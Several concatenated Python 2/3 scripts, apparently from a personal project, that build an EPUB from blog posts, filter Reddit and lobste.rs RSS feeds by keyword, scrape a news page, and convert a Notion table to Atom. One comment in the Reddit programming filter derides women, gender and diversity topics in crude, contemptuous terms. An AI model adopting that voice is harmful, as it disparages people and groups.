    def __init__(self, html_root):
        self.html_root = html_root
        self.book = BookGenerator('Environment and the programming language Self')

        self.book.add_author('Bystroushaak')
        self.book.set_language('en')
        self.book.add_metadata('DC', 'date', "2019-10-04")
        self.book.add_metadata('DC', 'rights', "Creative Commons BY-NC-SA")
        self.book.add_metadata('DC', 'generator', '', {'name': 'generator',
                                                       'content': PROJECT_URL})

        self.add_foreword()

        self.chapters_metdata = [
            ('Environment and the programming language Self part.html',
             'chap_01.xhtml'),
            ('Environment and the programming language Self part 1.html',
             'chap_02.xhtml'),
            ('Environment and the programming language Self part 2.html',
             'chap_03.xhtml'),
            ('Environment and the programming language Self part 3.html',
             'chap_04.xhtml'),
        ]

        for article_path, chapter_fn in self.chapters_metdata:
            self.convert_chapter(article_path, chapter_fn)

    def add_foreword(self):
        chapter = epub.EpubHtml(title="Foreword", file_name="foreword.html")
        chapter.content = """
<p>This book was converted from the HTML articles originally published at my blog
<a href="http://blog.rfox.eu">blog.rfox.eu</a>.</p>

<p>I want to apologize for the low quality of the export. If you feel like you
want to improve the quality, your contribution is most welcomed:<p>

<ul>
    <li><a href="%s">%s</a></li>
</ul> 
        """ % (PROJECT_URL, PROJECT_URL)
        self.book.add_chapter(chapter)

    def convert_chapter(self, article_path, chapter_fn, title=None):
        with open(os.path.join(self.html_root, article_path)) as f:
            dom = dhtmlparser.parseString(f.read())

        if not title:
            title = dom.find("title")[0].getContent()
            title = title.split("(")[-1].split(")")[0].capitalize()

        body = dom.find("div", {"class":"page-body"})[0]

        self._remove_fluff_from_the_beginning(body)
        self._remove_fluff_from_the_end(body)
        self._inline_images(body)

        chapter = epub.EpubHtml(title=title, file_name=chapter_fn)
        chapter.content = body.getContent()
        self.book.add_chapter(chapter)

    def _remove_fluff_from_the_beginning(self, body):
        while body.childs[0].getTagName() != "hr":
            body.childs.pop(0)
        body.childs.pop(0)

    def _remove_fluff_from_the_end(sefl, body):
        look_for = ["Next episodes", "Next episode", "Last episode", "Relevant discussions"]

        selected_phrase = ""
        for phrase in look_for:
            if body.find("h1", fn=lambda x: x.getContent() == phrase):
                selected_phrase = phrase
                break
        else:
            return

        while body.childs[-1].getContent() != selected_phrase:
            body.childs.pop()
        body.childs.pop()

    def _inline_images(self, body):
        for img in body.find("img"):
            epub_img = epub.EpubImage()

            epub_img.file_name = os.path.basename(img.params["src"])
            image_path = os.path.join(self.html_root, img.params["src"])
            with open(image_path, "rb") as f:
                epub_img.content = f.read()

            if "style" in img.params:
                del img.params["style"]

            self.book.add_image(epub_img)
            img.params["src"] = epub_img.file_name

    def generate_ebook(self, path):
        return self.book.generate_ebook(path)


def put_ebook_together(html_path):
    book = EAPLSEpub(html_path)
    book.generate_ebook('environment_and_programming_language_self_2019.epub')


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
            "PATH",
            help="Path to the directory with the blog section about Self."
    )
    args = parser.parse_args()

    put_ebook_together(args.PATH)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from filters.reddit_filter import filter_feed
from filters.reddit_filter import banned_pattern

from filters.dupe_filter import DupeFilter


# Functions & classes =========================================================
def filter_python_closure(dupe_filter):
    def filter_python(title, link, real_link, pub_date, description):
        title = title.lower()

        if title.strip().endswith("?"):
            return True

        if dupe_filter.in_dupes(real_link):
            return True

        if "twitter" in title:
            return True

        banned = [
            "django",
            "course",
            "pandas",
            "flask",
            "can anyone",
            "can someone",
            "help!",
            "need help",
            "need some help",
            "help with",
            "help me",
            "[help]",
            "(help)",
            "python tutorial",
            "I am new",
            "I am a new",
            "please help",
            "new to coding",
            "new to python",
            "learning python",
            "how to write",
            "newbie",
            "win32",
            "win32com",
            "komodo ide",
            "mezzanine",
            "pycharm",
            "scikit",
            "homework",
            "mysql",
            "trumpscript",
            "trump",
            "election",

            "windows 10",
            "windows 11",
            "windows 12",
            "windows 13",
            "windows 14",
            "windows 7",
            "windows 8",
            "windows vista",
            "windows xp",
        ]

        if banned_pattern(banned, title):
            return True

    return filter_python


# Main program ================================================================
if __name__ == '__main__':
    dupe_filter = DupeFilter.load_dupes("reddit_python_dupes.shelve")

    print filter_feed(
        chan_id="python",
        filter_item=filter_python_closure(dupe_filter)
    )

    dupe_filter.save_dupes()
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from urlparse import urljoin

import arrow

import httpkie
import dhtmlparser
from feedgen.feed import FeedGenerator


# Variables ===================================================================
URL = "http://liberland.org/cz/news/"
DOWNER = httpkie.Downloader()


# Functions & classes =========================================================
def _parse_link(div):
    # parse link
    link = div.find("a")
    if not link:
        return

    link = link[0].params.get("href", None)
    if not link:
        return

    return urljoin(URL, link)


def _parse_date(div):
    # parse date tag
    date_tag = div.find("h3")
    if not date_tag:
        return

    # parse the actual date
    date = date_tag[0].getContent()
    if not date:
        return

    raw_date = date.split(":")[-1].strip()
    raw_date = raw_date.split("<")[0]  # remove link to the article

    date = arrow.Arrow.strptime(raw_date, "%d.%m.%Y")

    return date.to("Europe/Prague").datetime


def parse(data):
    dom = dhtmlparser.parseString(data)

    for preview in dom.find("div", {"class": "articlePreview"}):
        title_and_link = preview.find("h2")

        # skip items without <h2>
        if not title_and_link:
            continue

        title_and_link = title_and_link[0]

        title = dhtmlparser.removeTags(title_and_link.getContent())
        link = _parse_link(title_and_link)
        date = _parse_date(preview)

        yield title, link, date


def unittest():
    data = DOWNER.download(URL)
    items = list(parse(data))

    return len(items) > 1


# Main program ================================================================
if __name__ == '__main__':
    fg = FeedGenerator()
    fg.id(URL)
    fg.title("Liberland.org - Novinky")
    fg.link(href=URL, rel='alternate')
    fg.language("cs")

    data = DOWNER.download(URL)
    for title, link, date in parse(data):
        fe = fg.add_entry()

        fe.id(link)
        fe.title(title.decode("utf-8"))
        fe.link(href=link)
        fe.updated(date)

    print fg.atom_str(pretty=True)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
"""
Translate links to articles to links to comments.
"""
# Imports =====================================================================
import httpkie
import dhtmlparser
from dhtmlparser import first


# Functions & classes =========================================================
def _download_feed():
    downer = httpkie.Downloader()

    return downer.download("https://lobste.rs/rss")


def _find_comments_link(item):
    comments_link = item.find("comments")

    if not comments_link:
        return None

    return first(comments_link).getContent()


def _find_link_element(item):
    link_el = item.find("link")

    if not link_el:
        return None

    return first(link_el)


def _construct_new_link_el(url):
    dom = dhtmlparser.parseString("<link>%s</link>" % url)

    return first(dom.find("link"))


def link_to_comments_instead_of_url(feed):
    rss_dom = dhtmlparser.parseString(feed)

    for item in rss_dom.find("item"):
        # print item
        comments_url = _find_comments_link(item)
        link_element = _find_link_element(item)

        if comments_url and link_element:
            link_element.replaceWith(
                _construct_new_link_el(comments_url)
            )

    xml_head = '<?xml version="1.0" encoding="UTF-8" ?="" />'
    valid_xml_head = '<?xml version="1.0" encoding="UTF-8"?>'

    return rss_dom.prettify().replace(xml_head, valid_xml_head)


# Main program ================================================================
if __name__ == '__main__':
    print link_to_comments_instead_of_url(_download_feed())
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import time
import shelve
import os.path
from contextlib import contextmanager


# Functions & classes =========================================================
# in 2.7, there is no context manager for shelve :S
@contextmanager
def shelver(fn):
    db = shelve.open(fn)
    yield db
    db.close()


class DupeFilter(object):
    dupe_key = "dupes"

    def __init__(self, fn=None):
        self.fn = fn
        self.dupes = set()
        self.protected = {}

        self.protected_time = 30 * 60  # 30m

    def in_dupes(self, item):
        if item in self.dupes:
            return True

        return self._update_protected(item)

    def _update_protected(self, item):
        if item not in self.protected:
            self.protected[item] = time.time() + self.protected_time
            return False

        if self.protected[item] <= time.time():
            self.dupes.update([item])
            del self.protected[item]
            return True

        return False

    @staticmethod
    def load_dupes(fn):
        if not os.path.exists(fn):
            return DupeFilter(fn=fn)

        with shelver(fn) as db:
            new_df = DupeFilter(fn=fn)
            df = db.get(DupeFilter.dupe_key, new_df)
            new_df.__dict__.update(df.__dict__)

            return new_df

    def save_dupes(self, fn=None):
        if not self.fn and not fn:
            raise IOError("Filename has to be set!")

        if not fn:
            fn = self.fn

        with shelver(fn) as db:
            db[DupeFilter.dupe_key] = self
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from string import maketrans

import httpkie
import dhtmlparser
from dhtmlparser import first


# Variables ===================================================================
URL = "https://www.reddit.com"


# Functions & classes =========================================================
def _download_feed(chan_id):
    downer = httpkie.Downloader()

    data = downer.download("%s/r/%s/.rss" % (URL, chan_id))

    search_link = (
        '<atom:link rel="self" ' +
        'href="%s/subreddits/search.rss?q=%s" ' % (URL, chan_id) +
        'type="application/rss+xml" />'
    )

    if search_link in data:
        raise ValueError("Incorrect `chan_id`: '%s'!" % chan_id)

    return data


def _pick_item_property(item, item_property):
    prop = item.find(item_property)

    if not prop:
        return None

    return first(prop).getContent()


def _parse_description_link(description):
    descr = description.replace("&#34;", '"')\
                       .replace("&lt;", "<")\
                       .replace("&gt;", ">")

    descr_dom = dhtmlparser.parseString(descr)

    link_tags = descr_dom.find("a", fn=lambda x: x.getContent() == "[link]")

    if not link_tags:
        return None

    link_tag = link_tags[-1].params.get("href")

    if not link_tag:
        return None

    return link_tag.replace("&quot;", "") \
                   .replace("http://", "") \
                   .replace("https://", "")


def filter_feed(chan_id, filter_item):
    rss = _download_feed(chan_id)
    rss_dom = dhtmlparser.parseString(rss)

    for item in rss_dom.find("entry"):
        title = _pick_item_property(item, "title")
        link = _pick_item_property(item, "link")
        pub_date = _pick_item_property(item, "published")
        description = _pick_item_property(item, "content")
        real_link = _parse_description_link(description)

        if link:
            link = link.params.get("href", None)

        result = filter_item(
            title=title,
            link=link,
            real_link=real_link,
            pub_date=pub_date,
            description=description,
        )
        if result:
            item.replaceWith(dhtmlparser.HTMLElement(""))

    xml = rss_dom.prettify().splitlines()

    return '<?xml version="1.0" encoding="UTF-8"?>' + "\n".join(xml[1:])


def banned_pattern(banned_words, line):
    line = line.strip().lower()

    for banword in banned_words:
        if banword.lower() in line:
            return True


def banned_pattern_tokens(banned_words, line):
    line = line.strip().lower()

    def test_multiple(words, line):
        test_words = [
            word in line
            for word in words
        ]
        if all(test_words):
            return True

    # create set of words
    split_chars = ".,!?/':;`(){}[]"
    trantab = maketrans(split_chars, len(split_chars) * " ")
    tokens = set(
        line.translate(trantab).split()
    )

    for banword in banned_words:
        if type(banword) in [list, tuple]:
            if test_multiple(banword, tokens):
                return True
        elif banword.lower() in tokens:
            return True
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from enchant.tokenize import get_tokenizer
from collections import namedtuple


# Variables ===================================================================
# Functions & classes =========================================================
def read_examples(fn):
    with open(fn) as f:
        data = f.read()

    parsed = (
        line
        for line in data.splitlines()
        if line.strip()
    )

    positive = []
    negative = []
    whitespace = {" ", "\t"}

    for expression in parsed:
        if expression[0] in whitespace:
            negative.append(expression.strip())
        else:
            positive.append(expression)

    nt = namedtuple("TrainingSet", "positive negative")

    return nt(positive, negative)


def tokenize(sentence_str):
    tokenizer = get_tokenizer("en_US")

    # [('Hello', 0), ('world', 7)] -> ["Hello", "world"]
    return [
        word_pos[0]
        for word_pos in tokenizer(sentence_str)
    ]


class Classificators(object):
    @staticmethod
    def capitalize_score(sentence):
        cap_words = [
            word
            for word in sentence
            if word[0].isalnum() and word[0] == word[0].upper()
        ]
        return len(cap_words) / len(sentence)

    @staticmethod
    def has_number_at_beginning(sentence):
        number_words = [
            "zero",
            "one",
            "two",
            "three",
            "four",
            "five",
            "six",
            "seven",
            "eight",
            "nine",
            "ten",
            "eleven",
            "twelve",
            "dozen",
            "thirteen",
            "fourteen",
            "fifteen",
            "sixteen",
            "seventeen",
            "eighteen",
            "nineteen",
            "twenty",
            "thirty",
            "forty",
            "fifty",
            "sixty",
            "seventy",
            "eighty",
        ]

        def test_word(word):
            if word.isdigit() and int(word) < 100:
                return True
            elif word.lower() in number_words:
                return True

            return False

        first = sentence[0]
        second = sentence[1]
        third = sentence[2]

        return test_word(first) or test_word(second) or test_word(third)

    @staticmethod
    def is_clickbaity(sentence):
        second_word_clickbaits = {
            "amazing",
            "bad",
            "best",
            "clues",
            "days",
            "engineering",
            "essential",
            "examples",
            "excellence",
            "excellent",
            "factor",
            "fantastic",
            "free",
            "funniest",
            "great",
            "habits",
            "languages",
            "mistakes",
            "most",
            "official",
            "open",
            "popular",
            "practices",
            "productivity",
            "questions",
            "reasons",
            "resolutions",
            "rules",
            "steps",
            "things",
            "tips",
            "typical",
            "use",
            "useful",
            "ways",
        }

        second_clickbait = False
        if len(sentence) > 1:
            second_clickbait = sentence[1] in second_word_clickbaits

        first_clickbait = False
        if sentence:
            first_clickbait = sentence[0] in {"top", "the", "my"}

        return first_clickbait or second_clickbait

    @staticmethod
    def contains_you(sentence):
        you_forms = {
            "you",
            "your",
            "yours",
        }

        matches = [
            word
            for word in sentence
            if word.lower() in you_forms
        ]

        return bool(matches)



# Main program ================================================================
if __name__ == '__main__':
    print read_examples("examples.txt")
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from filters.reddit_filter import filter_feed
from filters.reddit_filter import banned_pattern
from filters.reddit_filter import banned_pattern_tokens

from filters.dupe_filter import DupeFilter


# Functions & classes =========================================================
def filter_programming_closure(dupe_filter):
    def filter_programming(title, link, real_link, pub_date, description):
        if ".NET" in title.split():
            return True

        title = title.lower()

        # usually with "python", so the whitelist lets it go
        if "trumphscript" in title or "trumpscript" in title:
            return True

        whitelist = [
            "carmack",
            "clojure",
            "codeless",
            "digitalmars",
            "dlang",
            "emacs",
            "lisp",
            "pypy",
            "python",
            "pharo",
            "racket",
            "reality",
            "rms",
            "scheme",
            "self",
            "smalltalk",
            "stallman",
            "templeos",
            "virtual",
            "vr",
            "oculus",
            "vive",
            "hololens",
            "wolfram",
        ]

        if banned_pattern_tokens(whitelist, title):
            return False

        if dupe_filter.in_dupes(real_link):
            return True

        banned = [
            "c#",
            "c++",
            "c++11",
            "c++14",
            "clang",
            "dart",
            "elixir",
            "f#",
            "fortran",
            "golang",
            "haskell",
            "java",
            "javascript",
            "kotlin",
            "perl",
            "php",
            "ruby",
            "rust",
            "scala",
            "swift",
            "typescript",

            "android",
            "angular",
            "angularjs",
            "apache",
            "atlasdb",
            "aurelia",
            "citrix",
            "codepile",
            "coderpower",
            "cppcon",
            "devops",
            "dijkstra",
            "docker",
            "eclipse",
            "fizzbuzz",
            "forth",
            "gitlab",
            "gnocchi",
            "godmin",
            "gtalkabout",
            "hhvm",
            "hipchat",
            "houndify",
            "ifttt",
            "instagram",
            "intellij",
            "javadoc",
            "javafx",
            "javaone",
            "jclarity",
            "jdbc",
            "jekyll",
            "jenkins",
            "jetbrains",
            "jquery",
            "kafka",
            "kaminari",
            "lamp",
            "libreoffice",
            "linq",
            "makara",
            "matlab",
            "mongodb",
            "monocoque",
            "mysql",
            "nanofl",
            "neo4j",
            "netbeans",
            "nginx",
            "nodejs",
            "#nodejs",
            "npm",
            "openoffice",
            "paas",
            "phonegap",
            "phpunit",
            "platformio",
            "postgresql",
            "protractor",
            "reactjs",
            "redis",
            "redox",
            "rxjava",
            "selenium",
            "sqlite",
            "swagger",
            "twitter",
            "udacity",
            "webgl",
            "webrtc",
            "windbg",
            "windows",
            "winrt",
            "wordpress",
            "xamarin",
            "xcode",
            "trumpscript",
            "phpstorm",
            "pokemon",
            "trump",
            "election",
            "discord",
            "dockerizing",
            "webpack",
            "uber",
            "roo",
            "macbook",
            "jvm",
            "sql",
            "xmake",
            "Myrddin",
            "jsr",
            "electron",
            "ceylon",
            "interview",
            "interviews",
            "aws",
            "phd",
            "gdc",
            "expert",
            "gsoc",
            "borland",
            "oracle",
            "slack",
            "fullstack",
            "full-stack",
            "binutils",
            "ragel",
            "elena",
            "htaccess",

            # snake pits full of snakes, scorpions, spiders, shit and sjws
            "women",
            "ageism",
            "gender",
            "feminism",
            "diversity",
            "harrasment",
            "microaggression",
            ("micro", "aggression"),

            # I don't really care about these sentences
            ("full", "stack"),
            ("cloud", "computing"),
            ("oracle", "code"),
            ("first", "language"),
            ("microsoft", "surface"),
            ("microsoft", "azure"),
            ("anypoint", "studio"),
            ("css", "js"),
            ("css", "trick"),
            ("php", "framework"),
            ("asp", "net"),
            ("node", "js"),
            ("angluar", "js"),
            ("react", "js"),
            ("selected", "js"),
            ("sql", "injection"),
            ("css", "javascript"),
            ("css", "php"),
            ("c++", "stl"),
            ("google", "chrome"),
            ("modern", "web"),
            ("referrals", "free"),
            ("mobile", "ux"),
            ("recruit", "manage"),
            ("manage", "startup"),
            ("data", "analysis", "r"),

            # shity clickbait crap
            ("full", "stack", "web"),
            ("must", "have", "free"),
            ("growing", "tech", "stack"),

            # bullshit phrases
            ("how", "i", "learned", "to", "stop", "love"),
            ("considered", "harmful"),
        ]

        if banned_pattern_tokens(banned, title):
            return True

        # senteces as they are -> simple `s in title` check
        banned_sentences = [
            ".js",
            "amish programmer",
            "android app",
            "angular.js",
            "billing software",
            "hack 2.0",
            "help me",
            "komodo ide",
            "ms sql",
            "node.js",
            "riot.js",
            "react.js",
            "technical debt",
            "visual studio",
            "vs 2015",
            "vs2015",
            "windows 10",
            "windows 11",
            "windows 12",
            "windows 13",
            "windows 14",
            "windows 15",
            "windows 16",
            "windows 17",
            "windows 18",
            "windows 19",
            "windows 20",
            "windows 7",
            "windows 8",
            "windows vista",
            "windows xp",
        ]

        if banned_pattern(banned_sentences, title):
            return True

    return filter_programming


# Main program ================================================================
if __name__ == '__main__':
    dupe_filter = DupeFilter.load_dupes("reddit_programming_dupes.shelve")

    print filter_feed(
        chan_id="programming",
        filter_item=filter_programming_closure(dupe_filter)
    )

    dupe_filter.save_dupes()
#! /usr/bin/env python3
import pytz
import tzlocal
import datetime
import configparser

import pyatom
import requests
import dateparser


def get_record_values(json_data):
    api_url = "https://www.notion.so/api/v3/getRecordValues"
    resp = requests.post(api_url, json=json_data)
    return resp.json()


def load_page_chunk(json_data):
    api_url = "https://www.notion.so/api/v3/loadPageChunk"
    resp = requests.post(api_url, json=json_data)
    return resp.json()


def query_collection(json_data):
    api_url = "https://www.notion.so/api/v3/queryCollection"
    resp = requests.post(api_url, json=json_data)
    return resp.json()


def add_dashes_to_id(id_string):
    id_without_dashes = id_string.replace('-', '')

    tokens = [
        id_without_dashes[0:8],
        id_without_dashes[8:12],
        id_without_dashes[12:16],
        id_without_dashes[16:20],
        id_without_dashes[20:],
    ]

    return '-'.join(tokens)


def parse_table_info(page_id, limit=50):
    # chunks = load_page_chunk({
    #     "chunkNumber": 0,
    #     "limit": limit,
    #     "pageId": add_dashes_to_id(page_id),
    #     "verticalColumns": False,
    # })
    chunks = get_record_values({
        "requests": [{
            "table": "block",
            "id": add_dashes_to_id(page_id)
        }]
    })

    block_value = chunks["results"][0]["value"]
    collection_id = block_value["collection_id"]
    collection_view_id = block_value["view_ids"][0]

    data = query_collection({
        "collectionId": collection_id,
        "collectionViewId": collection_view_id,
        "query": {
            "aggregate": [{
                "id": "count",
                "type": "title",
                "property": "title",
                "view_type": "table",
                "aggregation_type": "count"
            }],
            "filter": [],
            "sort": [],
            "filter_operator": "and"
        },
        "loader": {
            "type": "table",
            "limit": 70,
            "userTimeZone": "Europe/Prague",
            "userLocale": "en",
            "loadContentCover": True
        }
    })

    collection_view = data["recordMap"]["collection_view"]
    collection = data["recordMap"]["collection"]

    collection_view_value = list(collection_view.values())[0]["value"]
    if collection_view_value["type"] != "table":
        raise ValueError("Uknown type: `%s`" % collection_view_value["type"])

    ordering = [
        x["property"]
        for x in collection_view_value["format"]["table_properties"]
        if x["visible"]
    ]

    collection_value = list(collection.values())[0]["value"]
    readable_names_of_columns = {
        key: val["name"]
        for key, val in collection_value["schema"].items()
    }

    data_block = data["recordMap"]["block"]

    for row_data in data_block.values():
        if not row_data.get("value", {}).get("properties"):
            continue

        properties = row_data["value"]["properties"]

        records = {}
        for key, item in properties.items():
            name = readable_names_of_columns[key]
            if len(item[0]) == 1:
                # [['Bystroushaak']]
                content = item[0][0]
            elif len(item) == 0 or len(item[0]) == 0:
                continue
            elif item[0][1][0][0] == "d":
                # [['‣', [['d', {'type': 'datetime', 'time_zone': 'Europe/Prague',
                # 'start_date': '2019-04-16', 'start_time': '11:59'}]]]]
                date_info = item[0][1][0][1]
                content = date_info["start_date"]
                if "start_time" in date_info:
                    content += " " + date_info["start_time"]
            elif item[0][1][0][0] == "a":
                records["URL"] = item[0][1][0][1]
                content = item[0][0]
            else:
                content = item

            records[name] = content

        if len(records.keys()) > 1:
            yield records


def convert_to_rss():
    config = configparser.ConfigParser()
    config.read("notion2rss.conf")
    channel_config = config["channel"]

    # bleh
    local_tz = tzlocal.get_localzone()
    timezone = datetime.datetime.now(pytz.timezone(str(local_tz))).strftime('%z')

    feed = pyatom.AtomFeed(
        title=channel_config["blog_name"],
        feed_url=channel_config["feed_url"],
        url=channel_config["blog_url"],
        author=channel_config["author"],
        timezone=timezone,
    )

    parsed_data = list(parse_table_info(config["channel"]["blog_id"]))

    if not parsed_data:
        raise ValueError("Can't parse notion data!")

    item_mapping = config["mapping"]
    for item in parsed_data:
        updated = item.get(item_mapping.get("updated", "-"), "")
        updated = dateparser.parse(updated)

        feed.add(
            title=item.get(item_mapping.get("title", "-"), "Update"),
            content=item.get(item_mapping.get("content", "-"), ""),
            content_type="text",
            author=item.get(item_mapping.get("author", "-"), channel_config["author"]),
            url=item.get(item_mapping.get("URL", "-"), None),
            updated=updated
        )

    return feed.to_string()


if __name__ == "__main__":
    assert add_dashes_to_id('89c7c5f0ab804edf99a4985cc0c11168') == "89c7c5f0-ab80-4edf-99a4-985cc0c11168"
    print(convert_to_rss())#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import urlparse

import dhtmlparser


# Functions & classes =========================================================
def cached(fn):
    """
    Cache decorator. This decorator simply uses ``*args`` as lookup key for
    cache dict.

    If you are using python3, use functools.lru_cache() instead.
    """
    cache = {}

    def cached_decorator(*args, **kwargs):
        if args in cache:
            return cache[args]

        val = fn(*args, **kwargs)
        cache[args] = val

        return val

    return cached_decorator


@cached
def _number_of_links(el):
    """
    Count number of links in `el`.

    Note:
        This function is cached. See :func:`cached` for details.

    Args:
        el (obj): HTMLElement instance.

    Returns:
        int: Number of occurences of ``<a>`` tag in `el`.
    """
    return len(el.find("a"))


def _parent_iterator(el):
    """
    Iterate thru ``.parent`` properties in double linked element tree.

    Args:
        el (obj): HTMLElement instance in double linked list.

    Raises:
        AttributeError: If `el` is not from double linked list.

    Yeilds:
        All parent elements.
    """
    while el.parent:
        yield el.parent
        el = el.parent


def _identify_jump(elements):
    """
    Indetify jump in list of pairs ``[num, el]``. Jump is defined as highest
    derivation of `num`.

    Args:
        elements (list of tuples): List of tuples, where first item is number.

    Returns:
        obj: `el` from the pair with highest derivation. See tests for details.
    """
    # perform numerical derivation of items in clusters
    old = 0
    jumps = {}
    for num, el in elements:
        jumps[el] = num - old
        old = num

    # pick item with highest derivation
    return max(jumps, key=lambda k: jumps[k])


def guess_toc_element(document):
    """
    For given `document`, guess which HTMLElement holds TOC (Table Of Content).

    This function picks most used cluster with highest derivation of ``<a>``
    element count.

    Args:
        document (str): Document which should contain TOC somewhere.

    Returns:
        obj: HTMLelement instance which looks like it *may* contain TOC.
    """
    dom = dhtmlparser.parseString(document)
    dhtmlparser.makeDoubleLinked(dom)

    links = dom.find("a")

    # construct parent tree
    tree = {}
    for link in links:
        tree[link] = []

        for parent in _parent_iterator(link):
            num_of_links = _number_of_links(parent)

            tree[link].append(
                (num_of_links, parent)
            )

    # find biggest jumps in number of elements in <a> clusters
    jumps = {}
    for link in links:
        jump = _identify_jump(tree[link])

        jumps[jump] = jumps.get(jump, 0) + 1

    # pick element containing most links
    return max(jumps, key=lambda k: jumps[k])


def guess_toc_links(document, base_url):
    """
    Look for TOC, return list of (relative) links from element which looks like
    TOC.

    Args:
        document (str): Document which should contain TOC somewhere.

    Returns:
        list: List of links from element which looks like it *may* contain TOC.
    """
    toc_element = guess_toc_element(document)

    links = (
        link.params["href"].replace("&amp;", "&")
        for link in toc_element.find("a")
        if "href" in link.params
    )

    return [
        link if "http" in link else urlparse.urljoin(base_url, link)
        for link in links
    ]
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import shutil
import os.path
import tempfile
from os.path import join

import components


# Variables ===================================================================
# Functions & classes =========================================================
class Book(object):
    def __init__(self):
        self.images = {}
        self.styles = {}
        self.chapters = []

        # required metadata
        self.title = None
        self.authors = []
        self.sub_title = None
        self.language = "en"

        # optional metadata
        self.isbn = None
        self.published = None
        self.publisher = None
        self.source = None

        self.cover = None


class EpubBook(Book):
    def __init__(self):
        super(EpubBook, self).__init__()

        self._tmp_dir = None

    def _create_mime(self):
        """
        Create mimetype file to identify ZIP as epub.
        """
        mimetype_fn = join(self._tmp_dir, "mimetype")

        with open(mimetype_fn, "w") as f:
            f.write("application/epub+zip")

    def _create_meta_inf(self):
        """
        Create meta information file pointing to content file.
        """
        meta_inf_path = join(self._tmp_dir, "META-INF")
        container_fn = join(meta_inf_path, "container.xml")

        os.mkdir(meta_inf_path)

        with open(container_fn, "w") as f:
            f.write("""<?xml version="1.0" encoding="utf-8"?>
<container version="1.0"
           xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf"
              media-type="application/oebps-package+xml" />
  </rootfiles>
</container>""")

    def _process_content(self):
        pass

    def _create_cover(self):
        pass

    def _create_toc_ncx(self):
        # TODO: cover
        pass

    def _create_content_opf(self):
        pass

    def _create_oebps(self):
        oebps_path = join(self._tmp_dir, "OEBPS")

        os.mkdir(oebps_path)
        self._process_content()

        if self.cover:
            self._create_cover()

        self._create_toc_ncx()
        self._create_content_opf()

    def to_epub(self):
        self._tmp_dir = tempfile.mkdtemp()

        self._create_mime()
        self._create_meta_inf()
        self._create_oebps()

        # TODO: zip everything

        # temporary directory cleanup
        # shutil.rmtree(self._tmp_dir)
        return self._tmp_dir  # TODO: remove

        # return zip_content
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from book import Book
from book import EpubBook

from components import Chapter
from components import HTMLChapter

from toc_guesser import guess_toc_links
from toc_guesser import guess_toc_element
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================


# Functions & classes =========================================================
class Part(object):
    def __init__(self, *args):
        self.chapters = args

    def _deep_download(self, book_ref):
        for chapter in self.chapters:
            chapter._deep_download(book_ref)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from image import Image

from chapter import Chapter
from chapter import HTMLChapter

from part import Part
from microchapter import MicroChapter
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import hashlib
import urlparse

import dhtmlparser

from tools import https_url
from tools import safe_filename


# Variables ===================================================================
# Functions & classes =========================================================
class Chapter(object):
    def __init__(self, title, content, filename):
        self.title = title
        self.content = content
        self.filename = filename

        self._suffix = ".txt"


class HTMLChapter(Chapter):
    def __init__(self, base_url, title=None, content=None, filename=None,
                 url=None, lazy=False):
        super(HTMLChapter, self).__init__(
            title=title,
            content=content,
            filename=filename,  # may be None, fixed later by property
        )

        self.url = url
        self.base_url = base_url

        self._suffix = ".html"

        self.dom = None
        self.cropped_content = None
        self.cropped_dom = None

        if not lazy:
            self.parse()

    def parse(self):
        try:
            self.dom = dhtmlparser.parseString(self.content)
        except UnicodeDecodeError:
            self.content = self.content.encode("utf-8")
            self.dom = dhtmlparser.parseString(self.content)

        self.cropped_content = self.crop_content(
            content=self.content,
            dom=self.dom
        )
        self.cropped_dom = dhtmlparser.parseString(self.cropped_content)

    def crop_content(self, content, dom):
        body = dom.find("body")

        if not body:
            return content

        return body[0].getContent()

    def link_on_banlist(self, link):
        if not (link.startswith(self.base_url) or
                link.startswith(https_url(self.base_url))):
            return True

        suffix = link.rsplit(".")[-1]
        if suffix in {"zip", "rar", "gz", "tar"}:
            return True

        return False

    def _to_absolute_url(self, link):
        if "://" in link:
            return link

        return urlparse.urljoin(self.base_url, link)

    def find_links(self):
        all_links = (
            self._to_absolute_url(link.params["href"])
            for link in self.dom.find("a")
            if link.params.get("href", None)
        )

        # filter links on banlist
        return [
            link
            for link in all_links
            if not self.link_on_banlist(link)
        ]

    def _find_images(self):
        return [
            self._to_absolute_url(img.params["src"])
            for img in self.dom.find("img")
            if img.params.get("src", None)
        ]

    def _find_styles(self):
        style_elements = [
            self._to_absolute_url(style.params["href"])
            for style in self.dom.find("style")
            if "href" in style.params
        ]

        link_elements = [
            self._to_absolute_url(style.params["href"])
            for style in self.dom.find("link", {"rel": "stylesheet"})
            if "href" in style.params
        ]

        link_elements2 = [
            self._to_absolute_url(style.params["href"])
            for style in self.dom.find("link", {"type": "text/css"})
            if "href" in style.params
        ]

        return style_elements + link_elements + link_elements2

    @property
    def title(self):
        if self.__dict__.get("title") is not None:
            return self.__dict__["title"]

        headings = []
        headings.extend(self.dom.find("title"))
        headings.extend(self.dom.find("h1"))
        headings.extend(self.dom.find("h2"))
        headings.extend(self.dom.find("h3"))
